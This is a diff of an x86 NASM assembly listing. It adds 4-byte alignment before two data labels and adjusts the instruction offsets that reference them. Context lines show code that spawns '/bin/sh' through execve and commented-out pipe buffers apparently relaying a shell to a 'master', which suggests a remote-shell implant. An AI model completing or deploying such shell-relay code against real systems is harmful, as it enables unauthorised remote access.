@@ -137,7 +137,7 @@
    137 0000007E 81C309000000            	add	ebx,execve_command		; ebx -> '/bin/sh',0
    138                                  
    139 00000084 89E9                    	mov	ecx,ebp
-   140 00000086 81C12C020000            	add	ecx,foo				; ecx -> foo
+   140 00000086 81C12E020000            	add	ecx,foo				; ecx -> foo
    141                                  
    142 0000008C 31D2                    	xor	edx,edx
    143 0000008E 8919                    	mov	[ecx],ebx			; foo := @'/bin/sh',0
@@ -320,7 +320,7 @@
    320 000001CD 31C0                    	xor	eax,eax
    321 000001CF B0A2                    	mov	al, 162
    322 000001D1 89EB                    	mov	ebx, ebp
-   323 000001D3 81C32C020000            	add	ebx, foo
+   323 000001D3 81C32E020000            	add	ebx, foo
    324 000001D9 89D9                    	mov	ecx, ebx
    325 000001DB 31D2                    	xor	edx,edx
    326 000001DD 8913                    	mov long [ebx], edx		; seconds
@@ -345,7 +345,7 @@
    345 00000201 31C0                    	xor	eax,eax
    346 00000203 B0A2                    	mov	al, 162
    347 00000205 89EB                    	mov	ebx, ebp
-   348 00000207 81C32C020000            	add	ebx, foo
+   348 00000207 81C32E020000            	add	ebx, foo
    349 0000020D 89D9                    	mov	ecx, ebx
    350 0000020F 31D2                    	xor	edx,edx
    351 00000211 895304                  	mov long [ebx+4], edx		; nanoseconds
@@ -425,22 +425,25 @@
    425 0000034C <res 00000100>          	resb	256
    426 0000044C 7C7C                    	db	'||'
    427                                  
-   428                                  foo EQU $ - data_start
-   429 0000044E 00000000                	dd	0
-   430                                  bar EQU $ - data_start
-   431 00000452 00000000                	dd	0
-   432                                  
-   433                                  ;child_pid EQU $ - data_start
-   434                                  ;
-   435                                  ;; pipes middleman<->shell
-   436                                  ;m2sh_0 EQU $ - data_start + 4			; shell reads
-   437                                  ;m2sh_1 EQU $ - data_start + 8			; master writes
-   438                                  ;sh2m_0 EQU $ - data_start + 12			; master reads
-   439                                  ;sh2m_1 EQU $ - data_start + 16			; shell writes
-   440                                  ;
-   441                                  ;rfrm_buffer EQU $ - data_start + 20		; FROM master
-   442                                  ;rto_buffer EQU $ - data_start + 276		; TO master
+   428 0000044E 90<rept>                align 4
+   429                                  
+   430                                  foo EQU $ - data_start
+   431 00000450 00000000                	dd	0
+   432                                  bar EQU $ - data_start
+   433 00000454 00000000                	dd	0
+   434                                  
+   435                                  
+   436                                  ;child_pid EQU $ - data_start
+   437                                  ;
+   438                                  ;; pipes middleman<->shell
+   439                                  ;m2sh_0 EQU $ - data_start + 4			; shell reads
+   440                                  ;m2sh_1 EQU $ - data_start + 8			; master writes
+   441                                  ;sh2m_0 EQU $ - data_start + 12			; master reads
+   442                                  ;sh2m_1 EQU $ - data_start + 16			; shell writes
    443                                  ;
-   444                                  ;foo EQU $ - data_start + 532
-   445                                  ;bar EQU $ - data_start + 536
+   444                                  ;rfrm_buffer EQU $ - data_start + 20		; FROM master
+   445                                  ;rto_buffer EQU $ - data_start + 276		; TO master
    446                                  ;
+   447                                  ;foo EQU $ - data_start + 532
+   448                                  ;bar EQU $ - data_start + 536
+   449                                  ;
